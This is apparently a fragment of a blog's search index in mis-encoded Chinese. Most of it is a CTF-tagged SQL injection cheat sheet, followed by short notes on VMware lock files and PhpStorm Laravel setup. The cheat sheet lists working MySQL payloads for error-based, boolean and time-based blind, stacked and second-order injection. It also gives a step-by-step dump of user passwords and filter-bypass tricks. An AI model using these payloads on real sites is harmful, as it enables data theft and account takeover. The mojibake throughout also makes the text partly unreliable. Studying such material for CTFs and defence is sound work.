â€˜^roâ€™æ¥è¿›è¡Œã€‚ åŸºäºæŠ¥é”™â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”æ„é€ payload è®©ä¿¡æ¯é€šè¿‡é”™è¯¯æç¤ºå›æ˜¾å‡ºæ¥â€”â€”â€”â€”â€”â€” select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a;Explain:æ­¤å¤„æœ‰ä¸‰ä¸ªç‚¹ï¼Œ ä¸€æ˜¯éœ€è¦ concat è®¡æ•°ï¼Œ äºŒæ˜¯ floorï¼Œå–å¾— 0 or 1ï¼Œè¿›è¡Œæ•°æ®çš„é‡å¤ï¼Œ ä¸‰æ˜¯ group by è¿›è¡Œåˆ†ç»„ï¼Œä½†å…·ä½“åŸç†è§£é‡Šä¸æ˜¯å¾ˆé€šï¼Œå¤§è‡´åŸç†ä¸ºåˆ†ç»„åæ•°æ®è®¡æ•°æ—¶é‡å¤é€ æˆçš„é”™è¯¯ã€‚ä¹Ÿæœ‰è§£é‡Šä¸º mysql çš„ bug çš„é—®é¢˜ã€‚ ä½†æ˜¯æ­¤å¤„éœ€è¦å°† rand(0)ï¼Œrand()éœ€è¦å¤šè¯•å‡ æ¬¡æ‰è¡Œã€‚ ä»¥ä¸Šè¯­å¥å¯ä»¥ç®€åŒ–æˆå¦‚ä¸‹çš„å½¢å¼ã€‚select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2)) å¦‚æœ rand è¢«ç¦ç”¨äº†å¯ä»¥ä½¿ç”¨ç”¨æˆ·å˜é‡æ¥æŠ¥é”™select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2) select exp(~(select * FROM(SELECT USER())a)) //double æ•°å€¼ç±»å‹è¶…å‡ºèŒƒå›´//Exp()ä¸ºä»¥ e ä¸ºåº•çš„å¯¹æ•°å‡½æ•°ï¼›ç‰ˆæœ¬åœ¨ 5.5.5 åŠå…¶ä»¥ä¸Šå¯ä»¥å‚è€ƒ exp æŠ¥é”™æ–‡ç« ï¼šhttp://www.cnblogs.com/lcamry/articles/5509124.html select !(select * from (select user())x) -ï¼ˆps:è¿™æ˜¯å‡å·ï¼‰ 0//bigint è¶…å‡ºèŒƒå›´ï¼›0 æ˜¯å¯¹ 0 é€ä½å–åï¼Œå¾ˆå¤§çš„ç‰ˆæœ¬åœ¨ 5.5.5 åŠå…¶ä»¥ä¸Š å¯ä»¥å‚è€ƒæ–‡ç«  bigint æº¢å‡ºæ–‡ç«  http://www.cnblogs.com/lcamry/articles/5509112.html extractvalue(1,concat(0x7e,(select @@version),0x7e)) //mysql å¯¹ xml æ•°æ®è¿›è¡ŒæŸ¥è¯¢å’Œä¿®æ”¹çš„ xpath å‡½æ•°ï¼Œxpath è¯­æ³•é”™è¯¯,32ä½å­—ç¬¦é™åˆ¶ updatexml(1,concat(0x7e,(select @@version),0x7e),1) //mysql å¯¹ xml æ•°æ®è¿›è¡ŒæŸ¥è¯¢å’Œä¿®æ”¹çš„ xpath å‡½æ•°ï¼Œxpath è¯­æ³•é”™è¯¯,32ä½å­—ç¬¦é™åˆ¶ select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;//mysql é‡å¤ç‰¹æ€§ï¼Œæ­¤å¤„é‡å¤äº† versionï¼Œæ‰€ä»¥æŠ¥é”™ æŠ¥é”™æ³¨å…¥æ€»ç»“å’Œç¤ºä¾‹ floor()å’Œrand() 1union select count(*),2,concat(&#39;:&#39;,(select database()),&#39;:&#39;,floor(rand()*2))as a from information_schema.tables group by a &#x2F;*åˆ©ç”¨é”™è¯¯ä¿¡æ¯å¾—åˆ°å½“å‰æ•°æ®åº“å*&#x2F; extractvalue() 1id&#x3D;1 and (extractvalue(1,concat(0x7e,(select user()),0x7e))) updatexml() 1id&#x3D;1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1)) geometrycollection() 1id&#x3D;1 and geometrycollection((select * from(select * from(select user())a)b)) multipoint() 1id&#x3D;1 and multipoint((select * from(select * from(select user())a)b)) polygon() 1id&#x3D;1 and polygon((select * from(select * from(select user())a)b)) multipolygon() 1id&#x3D;1 and multipolygon((select * from(select * from(select user())a)b)) linestring() 1id&#x3D;1 and linestring((select * from(select * from(select user())a)b)) multilinestring() 1id&#x3D;1 and multilinestring((select * from(select * from(select user())a)b)) exp() 1id&#x3D;1 and exp(~(select * from(select user())a)) åŸºäºæ—¶é—´ If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23 //if åˆ¤æ–­è¯­å¥ï¼Œ æ¡ä»¶ä¸ºå‡ï¼Œæ‰§è¡Œ sleepPsï¼š é‡åˆ°ä»¥ä¸‹è¿™ç§åˆ©ç”¨ sleep()å»¶æ—¶æ³¨å…¥è¯­å¥select sleep(find_in_set(mid(@@version, 1, 1), â€˜0,1,2,3,4,5,6,7,8,9,.â€™));è¯¥è¯­å¥æ„æ€æ˜¯åœ¨ 0-9 ä¹‹é—´æ‰¾ç‰ˆæœ¬å·çš„ç¬¬ä¸€ä½ã€‚ ä½†æ˜¯åœ¨æˆ‘ä»¬å®é™…æ¸—é€è¿‡ç¨‹ä¸­ï¼Œ è¿™ç§ç”¨æ³•æ˜¯ä¸å¯å–çš„ï¼Œå› ä¸ºæ—¶é—´ä¼šæœ‰ç½‘é€Ÿç­‰å…¶ä»–å› ç´ çš„å½±å“ï¼Œæ‰€ä»¥ä¼šå½±å“ç»“æœçš„åˆ¤æ–­ã€‚ UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE(â€˜MSGâ€™,â€™by 5 secondsâ€™)),null) FROM (select database() as current) as tb1;//BENCHMARK(count,expr)ç”¨äºæµ‹è¯•å‡½æ•°çš„æ€§èƒ½ï¼Œå‚æ•°ä¸€ä¸ºæ¬¡æ•°ï¼ŒäºŒä¸ºè¦æ‰§è¡Œçš„è¡¨è¾¾å¼ã€‚å¯ä»¥è®©å‡½æ•°æ‰§è¡Œè‹¥å¹²æ¬¡ï¼Œè¿”å›ç»“æœæ¯”å¹³æ—¶è¦é•¿ï¼Œé€šè¿‡æ—¶é—´é•¿çŸ­çš„å˜åŒ–ï¼Œåˆ¤æ–­è¯­å¥æ˜¯å¦æ‰§è¡ŒæˆåŠŸã€‚è¿™æ˜¯ä¸€ç§è¾¹ä¿¡é“æ”»å‡»ï¼Œåœ¨è¿è¡Œè¿‡ç¨‹ä¸­å ç”¨å¤§é‡çš„ cpu èµ„æºã€‚æ¨èä½¿ç”¨ sleep() å †å æŸ¥è¯¢æ³¨å…¥å±€é™æ€§ å †å æ³¨å…¥çš„å±€é™æ€§åœ¨äºå¹¶ä¸æ˜¯æ¯ä¸€ä¸ªç¯å¢ƒä¸‹éƒ½å¯ä»¥æ‰§è¡Œï¼Œ å¯èƒ½å—åˆ° API æˆ–è€…æ•°æ®åº“å¼•æ“ä¸æ”¯æŒçš„é™åˆ¶ï¼Œå½“ç„¶äº†æƒé™ä¸è¶³ä¹Ÿå¯ä»¥è§£é‡Šä¸ºä»€ä¹ˆæ”»å‡»è€…æ— æ³•ä¿®æ”¹æ•°æ®æˆ–è€…è°ƒç”¨ä¸€äº›ç¨‹åº åŸç† åˆ©ç”¨åˆ†å·ç»“æŸä¸€å¥æ‰§è¡Œ,ä»è€Œæ„é€ å¤šè¡Œè¯­å¥è¿›è¡Œæ³¨å…¥æ”»å‡» æŒ‰æ³¨å…¥çš„ç¨‹åº¦å’Œé¡ºåºä¸€é˜¶æ³¨å…¥å³ç›´æ¥æ³¨å…¥ï¼ŒæŸ¥çœ‹ä¸Šè¿°æ‰€æœ‰ äºŒé˜¶æ³¨å…¥ï¼ˆäºŒæ¬¡æ³¨å…¥ï¼‰1ã€é»‘å®¢é€šè¿‡æ„é€ æ•°æ®çš„å½¢å¼ï¼Œåœ¨æµè§ˆå™¨æˆ–è€…å…¶ä»–è½¯ä»¶ä¸­æäº¤ HTTP æ•°æ®æŠ¥æ–‡è¯·æ±‚åˆ°æœåŠ¡ç«¯è¿›è¡Œå¤„ç†ï¼Œæäº¤çš„æ•°æ®æŠ¥æ–‡è¯·æ±‚ä¸­å¯èƒ½åŒ…å«äº†é»‘å®¢æ„é€ çš„ SQL è¯­å¥æˆ–è€…å‘½ä»¤ã€‚ 2ã€æœåŠ¡ç«¯åº”ç”¨ç¨‹åºä¼šå°†é»‘å®¢æäº¤çš„æ•°æ®ä¿¡æ¯è¿›è¡Œå­˜å‚¨ï¼Œ é€šå¸¸æ˜¯ä¿å­˜åœ¨æ•°æ®åº“ä¸­ï¼Œ ä¿å­˜çš„æ•°æ®ä¿¡æ¯çš„ä¸»è¦ä½œç”¨æ˜¯ä¸ºåº”ç”¨ç¨‹åºæ‰§è¡Œå…¶ä»–åŠŸèƒ½æä¾›åŸå§‹è¾“å…¥æ•°æ®å¹¶å¯¹å®¢æˆ·ç«¯è¯·æ±‚åšå‡ºå“åº”ã€‚ 3ã€é»‘å®¢å‘æœåŠ¡ç«¯å‘é€ç¬¬äºŒä¸ªä¸ç¬¬ä¸€æ¬¡ä¸ç›¸åŒçš„è¯·æ±‚æ•°æ®ä¿¡æ¯ã€‚ 4ã€æœåŠ¡ç«¯æ¥æ”¶åˆ°é»‘å®¢æäº¤çš„ç¬¬äºŒä¸ªè¯·æ±‚ä¿¡æ¯åï¼Œ ä¸ºäº†å¤„ç†è¯¥è¯·æ±‚ï¼Œ æœåŠ¡ç«¯ä¼šæŸ¥è¯¢æ•°æ®åº“ä¸­å·²ç»å­˜å‚¨çš„æ•°æ®ä¿¡æ¯å¹¶å¤„ç†ï¼Œ ä»è€Œå¯¼è‡´é»‘å®¢åœ¨ç¬¬ä¸€æ¬¡è¯·æ±‚ä¸­æ„é€ çš„ SQL è¯­å¥æˆ–è€…å‘½ä»¤åœ¨æœåŠ¡ç«¯ç¯å¢ƒä¸­æ‰§è¡Œã€‚ 5ã€æœåŠ¡ç«¯è¿”å›æ‰§è¡Œçš„å¤„ç†ç»“æœæ•°æ®ä¿¡æ¯ï¼Œ é»‘å®¢å¯ä»¥é€šè¿‡è¿”å›çš„ç»“æœæ•°æ®ä¿¡æ¯åˆ¤æ–­äºŒæ¬¡æ³¨å…¥æ¼æ´åˆ©ç”¨æ˜¯å¦æˆåŠŸã€‚ä¾‹ï¼š å…ˆæ³¨å†Œä¸€ä¸ª adminâ€™#çš„è´¦å·ï¼Œæ¥ä¸‹æ¥ç™»å½•è¯¥å¸å·åè¿›è¡Œä¿®æ”¹å¯†ç ã€‚æ­¤æ—¶ä¿®æ”¹çš„å°±æ˜¯ admin çš„å¯†ç ã€‚Sql è¯­å¥å˜ä¸º UPDATE users SET passwd=â€New_Passâ€ WHERE username =â€™ adminâ€™ # â€˜ ANDpassword=â€™ ï¼Œ ä¹Ÿ å°± æ˜¯ æ‰§ è¡Œ äº† UPDATE users SET passwd=â€New_Passâ€ WHERE username =â€™adminâ€™ 0x03 åŸºæœ¬æ‰‹å·¥æ³¨å…¥æµç¨‹è¦ä»selectè¯­å¥ä¸­è·å¾—æœ‰ç”¨çš„ä¿¡æ¯ï¼Œå¿…é¡»ç¡®å®šè¯¥æ•°æ®åº“ä¸­çš„å­—æ®µæ•°å’Œé‚£ä¸ªå­—æ®µèƒ½å¤Ÿè¾“å‡ºï¼Œè¿™æ˜¯å‰æã€‚ 1ã€MySQL &gt;= 5.0ï¼ˆ1ï¼‰è·å–å­—æ®µæ•°1order by n &#x2F;*é€šè¿‡ä¸æ–­å°è¯•æ”¹å˜nçš„å€¼æ¥è§‚å¯Ÿé¡µé¢ååº”ç¡®å®šå­—æ®µæ•°*&#x2F; ï¼ˆ2ï¼‰è·å–ç³»ç»Ÿæ•°æ®åº“ååœ¨MySQL &gt;5.0ä¸­ï¼Œæ•°æ®åº“åå­˜æ”¾åœ¨information_schemaæ•°æ®åº“ä¸‹schemataè¡¨schema_nameå­—æ®µä¸­ 1select null,null,schema_name from information_schema.schemata ï¼ˆ3ï¼‰è·å–å½“å‰æ•°æ®åº“å1select null,null,...,database() ï¼ˆ4ï¼‰è·å–æ•°æ®åº“ä¸­çš„è¡¨1select null,null,...,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() æˆ– 1select null,null,...,table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1 ï¼ˆ5ï¼‰è·å–è¡¨ä¸­çš„å­—æ®µè¿™é‡Œå‡è®¾å·²ç»è·å–åˆ°è¡¨åä¸ºuser 1select null,null,...,group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39; ï¼ˆ6ï¼‰è·å–å„ä¸ªå­—æ®µå€¼è¿™é‡Œå‡è®¾å·²ç»è·å–åˆ°è¡¨åä¸ºuserï¼Œä¸”å­—æ®µä¸ºusernameå’Œpassword 1select null,group_concat(username,password) from users 2ã€MySQL &lt; 5.0MySQL &lt; 5.0 æ²¡æœ‰ä¿¡æ¯æ•°æ®åº“information_schemaï¼Œæ‰€ä»¥åªèƒ½æ‰‹å·¥æšä¸¾çˆ†ç ´ï¼ˆäºŒåˆ†æ³•æ€æƒ³ï¼‰ã€‚ è¯¥æ–¹å¼é€šå¸¸ç”¨äºç›²æ³¨ã€‚ ç›¸å…³å‡½æ•°length(str) ï¼šè¿”å›å­—ç¬¦ä¸²strçš„é•¿åº¦ substr(str, pos, len) ï¼šå°†strä»posä½ç½®å¼€å§‹æˆªå–lené•¿åº¦çš„å­—ç¬¦è¿›è¡Œè¿”å›ã€‚æ³¨æ„è¿™é‡Œçš„posä½ç½®æ˜¯ä»1å¼€å§‹çš„ï¼Œä¸æ˜¯æ•°ç»„çš„0å¼€å§‹ mid(str,pos,len) ï¼šè·Ÿä¸Šé¢çš„ä¸€æ ·ï¼Œæˆªå–å­—ç¬¦ä¸² ascii(str) ï¼šè¿”å›å­—ç¬¦ä¸²strçš„æœ€å·¦é¢å­—ç¬¦çš„ASCIIä»£ç å€¼ ord(str) ï¼šå°†å­—ç¬¦æˆ–å¸ƒå°”ç±»å‹è½¬æˆascllç  if(a,b,c) ï¼šaä¸ºæ¡ä»¶ï¼Œaä¸ºtrueï¼Œè¿”å›bï¼Œå¦åˆ™è¿”å›cï¼Œå¦‚if(1&gt;2,1,0),è¿”å›0 ï¼ˆ1ï¼‰åŸºäºå¸ƒå°”çš„ç›²æ³¨1and ascii(substr((select database()),1,1))&gt;64 &#x2F;*åˆ¤æ–­æ•°æ®åº“åçš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„asciiå€¼æ˜¯å¦å¤§äº64*&#x2F; ï¼ˆ2ï¼‰åŸºäºæ—¶é—´çš„ç›²æ³¨1id&#x3D;1 union select if(SUBSTRING(user(),1,4)&#x3D;&#39;root&#39;,sleep(4),1),null,null &#x2F;*æå–ç”¨æˆ·åå‰å››ä¸ªå­—ç¬¦åšåˆ¤æ–­ï¼Œæ­£ç¡®å°±å»¶è¿Ÿ4ç§’ï¼Œé”™è¯¯è¿”å›1*&#x2F; 0x04SQLæ³¨å…¥ç»•è¿‡æŠ€æœ¯ å¤§å°å†™ç»•è¿‡ åŒå†™ç»•è¿‡ ç¼–ç ç»•è¿‡ï¼ˆurlå…¨ç¼–ç ã€åå…­è¿›åˆ¶ï¼‰ å†…è”æ³¨é‡Šç»•è¿‡ å…³é”®å­—æ›¿æ¢ é€—å·ç»•è¿‡ substrã€mid()å‡½æ•°ä¸­å¯ä»¥åˆ©ç”¨from toæ¥æ‘†è„±å¯¹é€—å·çš„åˆ©ç”¨ï¼› limitä¸­å¯ä»¥åˆ©ç”¨offsetæ¥æ‘†è„±å¯¹é€—å·çš„åˆ©ç”¨ æ¯”è¾ƒç¬¦å·( &gt;ã€&lt; )ç»•è¿‡ï¼ˆgreatestã€between and) é€»è¾‘ç¬¦å·çš„æ›¿æ¢ï¼ˆand=&amp;&amp; or=|| xor=| not=!ï¼‰ ç©ºæ ¼ç»•è¿‡ï¼ˆç”¨æ‹¬å·ï¼Œ+ç­‰ç»•è¿‡ï¼‰ ç­‰ä»·å‡½æ•°ç»•è¿‡ hex()ã€bin()=ascii() concat_ws()=group_concat() mid()ã€substr()=substring() httpå‚æ•°æ±¡æŸ“ id=1 union select+1,2,3+from+users+where+id=1â€“ å˜ä¸º id=1 union select+1&amp;id=2,3+from+users+where+id=1â€“ ç¼“å†²åŒºæº¢å‡ºç»•è¿‡ (id=1 and (select 1)=(Select 0xAAAAAAAAAAAAAAAAAAAAA)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 ,27,28,29,30,31,32,33,34,35,36â€“+ å…¶ä¸­0xAAAAAAAAAAAAAAAAAAAAAè¿™é‡ŒAè¶Šå¤šè¶Šå¥½ã€‚ã€‚ä¸€èˆ¬ä¼šå­˜åœ¨ä¸´ç•Œå€¼ï¼Œå…¶å®è¿™ç§æ–¹æ³•è¿˜å¯¹åç¼€åçš„ç»•è¿‡ä¹Ÿæœ‰ç”¨) ä¸ç”¨or and æ¥è¿›è¡Œboolç›²æ³¨ åŸç† 12id&#x3D;1^1^1&#x3D;&gt;id&#x3D;1 payload 12341^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),&#123;0&#125;,1))&#x3D;&#123;1&#125;)^1&quot;#çˆ†åº“1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)&#x3D;&#39;geek&#39;),%s,1))&#x3D;%s)^1#çˆ†å­—æ®µ","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"sql","slug":"sql","permalink":"https://yanmymickey.github.io/tags/sql/"}]},{"title":"è™šæ‹ŸæœºæŒ‚èµ·æ— æ³•æ¢å¤","date":"2020-01-15T16:00:00.000Z","path":"2020/01/16/Note/è™šæ‹ŸæœºæŒ‚èµ·æ— æ³•æ¢å¤/","text":"è™šæ‹ŸæœºæŒ‚èµ·æ— æ³•æ¢å¤æŒ‚èµ·vmware æ”¯æŒå‡ ç§å·¥ä½œçŠ¶æ€:å…³æœºï¼ŒæŒ‚èµ·ï¼Œé‡æ–°å¯åŠ¨ æŒ‚èµ·ï¼šä¸‹æ¬¡æ‰“å¼€è™šæ‹Ÿæœºä¼šè¿˜åŸåˆ°æŒ‚èµ·æ—¶è™šæ‹Ÿæœºçš„çŠ¶æ€ å¦‚ä½•åšåˆ°ï¼Ÿä¸ºäº†ä¿å­˜æŒ‚èµ·æ—¶è™šæ‹ŸæœºçŠ¶æ€ï¼Œä¼šåœ¨è™šæ‹Ÿæœºæ–‡ä»¶å¤¹åˆ›å»ºä¸€ä¸ªvmessåç¼€çš„æ–‡ä»¶ï¼Œ è¿™ä¸ªæ–‡ä»¶è®°å½•äº†è™šæ‹ŸæœºæŒ‚èµ·çŠ¶æ€ å…³äºå¼ºåˆ¶å…³é—­vmwareç”±äºå¡ä½æˆ–å…¶ä»–å¼‚å¸¸åŸå› å¼ºåˆ¶å…³é—­vmwareï¼Œå†æ¬¡å¼€å¯ä¼šæ˜¾ç¤ºè¢«é”ä½æ— æ³•æ‰“å¼€ åŸå› ï¼šå› ä¸ºä¸€ä¸ªè™šæ‹Ÿæœºæ‰“å¼€ï¼Œé¿å…é‡å¤å¼€å¯åŒä¸€è™šæ‹Ÿæœºï¼Œä¼šåˆ›å»ºå‡ ä¸ªlckæ–‡ä»¶å¤¹å°†è¿™ä¸ªè™šæ‹Ÿæœºé”ä½ï¼Œè€Œå¼ºåˆ¶é€€å‡ºä¼šå¯¼è‡´è™šæ‹Ÿæœºæ¥ä¸åŠåˆ é™¤è¿™å‡ ä¸ªæ–‡ä»¶å¤¹ï¼Œä¸‹æ¬¡å†æ‰“å¼€ï¼Œå¯¼è‡´è¯»å–åˆ°lckæ–‡ä»¶å¤¹ï¼Œè¢«é”ä½æ— æ³•æ‰“å¼€ã€‚ è§£å†³åŠæ³•åˆ é™¤vmessæ–‡ä»¶å’Œæ‰€æœ‰lckæ–‡ä»¶å¤¹ ç»“æœï¼šä¼šä¸¢å¤±ä¿å­˜çš„è™šæ‹ŸæœºçŠ¶æ€ï¼Œè™šæ‹Ÿæœºé‡æ–°å¼€æœº æ³¨æ„ å¦‚æœå‡ºç°ç¨‹åºå ç”¨æ— æ³•åˆ é™¤çš„æƒ…å†µï¼Œå¯ä»¥æ‰¾åˆ°å ç”¨ç¨‹åºå…³é—­åå†åˆ é™¤ è¿™æ ·ä¼šå¯¼è‡´å†æ¬¡æ‰“å¼€è™šæ‹Ÿæœºå‡ºç°æ­£åœ¨ç­‰å¾…è¿æ¥ï¼Œå› ä¸ºå ç”¨ç¨‹åºè¢«å…³é—­äº† é‡å¯æˆ–è€…æ‰¾åˆ°å ç”¨ç¨‹åºå†æ¬¡å¼€å¯å°±å¥½äº†","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"}]},{"title":"é…ç½®phpstormæ”¯æŒlaravelä»£ç æç¤º","date":"2020-01-11T16:00:00.000Z","path":"2020/01/12/Note/é…ç½®phpstormæ”¯æŒlaravelä»£ç æç¤º/","text":"é…ç½®phpstormæ”¯æŒlaravelä»£ç æç¤ºå‰è¨€å®‰è£…å’Œä½¿ç”¨laravel-ide-helperå’Œphpstormä¸­çš„laravelæ’ä»¶ laravelæ’ä»¶ åœ¨file-&gt;settings-&gt;pluginsä¸­æœç´¢laravelå¹¶å®‰è£… åœ¨file-&gt;settings-&gt;languages &amp; Frameworks-&gt;php-&gt;laravelä¸­å¯ç”¨,å‹¾é€‰enabledé€‰æ‹©æ¡† ä¸¤ç§æƒ…å†µé…ç½®viewsç­‰æç¤º è‹¥laravelä¸ºphpstormæ‰“å¼€çš„é¡¹ç›®ç›®å½•,åˆ™é»˜è®¤é…ç½®å³å¯ç”¨ è‹¥laravelä¸ºphpstormæ‰“å¼€çš„é¡¹ç›®ç›®å½•çš„å­ç›®å½•,åˆ™éœ€è¦é…ç½® file-&gt;settings-&gt;languages &amp; Frameworks-&gt;php-&gt;laravel-&gt;views/templates ä»¿ç…§é»˜è®¤çš„é…ç½®,ä»æ ¹ç›®å½•å¼€å§‹ä¹¦å†™è·¯å¾„ ä¾‹å¦‚D:\\phpstudy_pro\\WWW\\blog\\app\\views laravel-ide-helperéœ€è¦å€ŸåŠ©composer composer å®‰è£… laravel-ide-helper composer require --dev barryvdh/laravel-ide-helper é…ç½®åœ¨ ã€Œconfig/app.phpã€çš„ ã€Œprovidersã€æ•°ç»„ä¸­åŠ å…¥ 1Barryvdh\\LaravelIdeHelper\\IdeHelperServiceProvider::class Laravel ç‰ˆæœ¬å°äº 5.5 çš„è¯ï¼Œéœ€è¦æ³¨å†Œæä¾›è€…ï¼Œ5.5ä¹‹åçš„ç‰ˆæœ¬laravelåŠ å…¥äº†è‡ªåŠ¨æ³¨å†Œ **æ³¨:**å¦‚æœåªåœ¨å¼€å‘ç¯å¢ƒä¸­å®‰è£…ã€Œlarave-ide-helperã€ï¼Œå¯ä»¥åœ¨ã€Œapp/Providers/AppServiceProvider.phpã€çš„ã€Œregisterã€æ–¹æ³•ä¸­å†™å…¥ä¸‹é¢ä»£ç ï¼š 1234567public function register()&#123; if ($this-&gt;app-&gt;environment() !&#x3D;&#x3D; &#39;production&#39;) &#123; $this-&gt;app-&gt;register(\\Barryvdh\\LaravelIdeHelper\\IdeHelperServiceProvider::class); &#125; &#x2F;&#x2F; ...&#125; å¯¼å‡ºé…ç½®æ–‡ä»¶ï¼ˆå¦‚æœé»˜è®¤é…ç½®å°±æ»¡è¶³éœ€æ±‚äº†ï¼Œä¹Ÿå¯ä»¥å¿½ç•¥è¿™ä¸€æ­¥ï¼‰ 1php artisan vendor:publish --provider&#x3D;&quot;Barryvdh\\LaravelIdeHelper\\IdeHelperServiceProvider&quot; --tag&#x3D;config ä½¿ç”¨123php artisan ide-helper:generate - ä¸º Facades ç”Ÿæˆæ³¨é‡Šphp artisan ide-helper:models - ä¸ºæ•°æ®æ¨¡å‹ç”Ÿæˆæ³¨é‡Šphp artisan ide-helper:meta - ç”Ÿæˆ PhpStorm Meta file è‡ªåŠ¨ä¸ºFacades ç”Ÿæˆæ³¨é‡Šç»ˆç«¯è¾“å…¥ä»¥ä¸‹å‘½ä»¤ 1php artisan ide-helper:generate æ³¨: å¦‚æœå­˜åœ¨æ–‡ä»¶ ã€Œbootstrap/compiled.phpã€ éœ€è¦å…ˆåˆ é™¤ï¼Œ å¯ä»¥åœ¨ç”Ÿæˆæ–‡å½“å‰è¿è¡Œ php artisan clear-compiledã€‚ è‡ªåŠ¨ä¸ºæ¨¡å‹ç”Ÿæˆæ³¨é‡Šä¸ºæ‰€æœ‰æ¨¡å‹ç”Ÿæˆæ³¨é‡Š 123php artisan ide-helper:models#è¿™æ—¶ä¼šå‡ºç°è¯¢é—®ï¼šDo you want to overwrite the existing model files? Choose no to write to _ide_helper_models.php instead? (Yes&#x2F;No): (yes&#x2F;no) [no]: **æ³¨:**è¾“å…¥ yes åˆ™ä¼šç›´æ¥åœ¨æ¨¡å‹æ–‡ä»¶ä¸­å†™å…¥æ³¨é‡Šï¼Œå¦åˆ™ä¼šç”Ÿæˆã€Œ_ide_helper_models.phpã€æ–‡ä»¶ã€‚å»ºè®®é€‰æ‹© yesï¼Œè¿™æ ·åœ¨è·Ÿè¸ªæ–‡ä»¶çš„æ—¶å€™ä¸ä¼šè·³è½¬åˆ°ã€Œ_ide_helper_models.phpã€æ–‡ä»¶ï¼Œä¸è¿‡è¿™ä¹ˆåšæœ€å¥½å¯¹æ¨¡å‹æ–‡ä»¶åšä¸ªå¤‡ä»½ï¼Œè‡³å°‘åœ¨ç”Ÿæˆæ³¨é‡Šä¹‹å‰ç”¨ git æ§åˆ¶ä¸€ä¸‹ç‰ˆæœ¬ï¼Œä»¥é˜²ä¸‡ä¸€ã€‚ æç¤ºï¼š ä¸ºæ¨¡å‹ç”Ÿæˆå­—æ®µä¿¡æ¯å¿…é¡»åœ¨æ•°æ®åº“ä¸­å­˜åœ¨ç›¸åº”çš„æ•°æ®è¡¨ï¼Œä¸è¦ç”Ÿæˆ migration è¿˜æ²¡è¿è¡Œ migrate çš„æ—¶å€™å°±ç”Ÿæˆæ³¨é‡Šï¼Œè¿™æ ·æ˜¯å¾—ä¸åˆ°å­—æ®µä¿¡æ¯çš„ã€‚ è‡ªåŠ¨ä¸ºé“¾å¼æ“ä½œæ³¨é‡Šè¿™æ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿä¸¾ä¸ªä¾‹å­ï¼Œåœ¨ migration æ–‡ä»¶ä¸­ç»å¸¸å¯ä»¥çœ‹è§è¿™æ ·çš„ä»£ç ï¼š 1$table-&gt;string(&#39;email&#39;)-&gt;unique(); è¿™æ—¶å°±ç®—è°ƒç”¨è¿‡äº† php artisan ide-helper:generateï¼Œåœ¨è°ƒç”¨åƒ -&gt;unique() è¿™æ ·çš„é“¾å¼æ“ä½œçš„æ—¶å€™ä¹Ÿæ— æ³•å®ç°ä»£ç æç¤º. éœ€è¦å°†é…ç½®æ–‡ä»¶(ide-help.php,å¯ä»¥ä½¿ç”¨phpstormçš„Find-&gt;Find in path æŸ¥æ‰¾ include_fluent)&#39;include_fluent&#39; =&gt; false ä¿®æ”¹ä¸º &#39;include_fluent&#39; =&gt; trueï¼Œ é‡æ–°è¿è¡Œ php artisan ide-helper:generateã€‚ ç”Ÿæˆ .phpStorm.meta.phpå¯ä»¥ç”Ÿæˆä¸€ä¸ª.phpStorm.meta.phpæ–‡ä»¶å»æ”¯æŒå·¥å‚æ¨¡å¼. å¯¹äº Laravel, è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥è®© PhpStorm ç†è§£æˆ‘ä»¬ä» IoC å®¹å™¨ä¸­è§£å†³äº†ä»€ä¹ˆç±»å‹çš„å¯¹è±¡ã€‚ä¾‹å¦‚ï¼šäº‹ä»¶å°†è¿”å›ä¸€ä¸ªã€ŒIlluminate\\Events\\Dispatcherã€å¯¹è±¡ï¼Œåˆ©ç”¨ meta æ–‡ä»¶æ‚¨å¯ä»¥è°ƒç”¨ app(&#39;events&#39;) å¹¶ä¸”å®ƒå°†è‡ªåŠ¨å®Œæˆ Dispatcher çš„æ–¹æ³•ã€‚ 12345678app(&#39;events&#39;)-&gt;fire();\\App::make(&#39;events&#39;)-&gt;fire();&#x2F;** @var \\Illuminate\\Foundation\\Application $app *&#x2F;$app-&gt;make(&#39;events&#39;)-&gt;fire();&#x2F;&#x2F; When the key is not found, it uses the argument as class nameapp(&#39;App\\SomeClass&#39;); **æç¤º:**å¯èƒ½éœ€è¦é‡å¯ Phpstorm ä½¿ .phpStorm.meta.php æ–‡ä»¶ç”Ÿæ•ˆã€‚ è‡ªåŠ¨è¿è¡Œ generateæƒ³åœ¨ä¾èµ–åŒ…æ›´æ–°æ˜¯è‡ªåŠ¨æ›´æ–°æ³¨é‡Šï¼Œå¯ä»¥åœ¨ composer.json æ–‡ä»¶ä¸­åšå¦‚ä¸‹é…ç½®ï¼š 1234567&quot;scripts&quot;:&#123; &quot;post-update-cmd&quot;: [ &quot;Illuminate\\\\Foundation\\\\ComposerScripts::postUpdate&quot;, &quot;php artisan ide-helper:generate&quot;, &quot;php artisan ide-helper:meta&quot; ]&#125; ä»£ç æç¤ºå½“æƒ³æç¤ºviewsæ–‡ä»¶,modelsæ–‡ä»¶æ—¶å¯ä»¥ä½¿ç”¨é»˜è®¤å¿«æ·é”®ctrl+space **æ³¨:**ä½†å¯èƒ½ä¼šè¢«åˆ‡æ¢è¾“å…¥æ³•ç­‰å 